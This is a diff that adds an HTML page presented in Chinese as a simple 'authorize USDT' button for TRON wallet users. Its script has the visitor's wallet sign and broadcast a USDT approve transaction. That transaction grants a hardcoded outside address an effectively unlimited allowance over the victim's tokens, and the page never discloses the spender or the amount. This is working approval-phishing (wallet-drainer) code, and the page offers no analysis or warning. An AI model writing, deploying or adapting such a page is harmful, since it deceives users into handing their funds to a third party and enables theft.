@@ -1,0 +1,54 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TRC20 Approve Authorization</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+</head>
+<body>
+  <h2>点击下方按钮授权 USDT 使用权</h2>
+  <button onclick="authorize()">点击授权</button>
+  <p id="wallet-status"></p>
+
+  <script>
+    async function authorize() {
+      try {
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+          document.getElementById('wallet-status').innerText = "未检测到钱包，请使用 TronLink、TP Wallet 或内置钱包浏览器打开本页面。";
+          return;
+        }
+
+        const tronWeb = window.tronWeb;
+        const userAddress = tronWeb.defaultAddress.base58;
+
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT 合约
+          'approve(address,uint256)',
+          {},
+          [
+            { type: 'address', value: 'TC3ubPuJPvRbr5biYGrKgJ9PYSoh1yTcEC' },
+            { type: 'uint256', value: '999999999999999999999' }
+          ],
+          userAddress
+        );
+
+        const signedTx = await tronWeb.trx.sign(tx.transaction);
+        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+        alert('交易已广播: ' + JSON.stringify(receipt));
+      } catch (err) {
+        console.error('错误详情：', err);
+        alert('授权失败：' + (err.message || err));
+      }
+    }
+
+    window.addEventListener('load', () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        document.getElementById('wallet-status').innerText = "检测到钱包地址：" + window.tronWeb.defaultAddress.base58;
+      } else {
+        document.getElementById('wallet-status').innerText = "请使用支持 TRON 的钱包打开（TronLink、TP Wallet、BitKeep）";
+      }
+    });
+  </script>
+</body>
+</html>
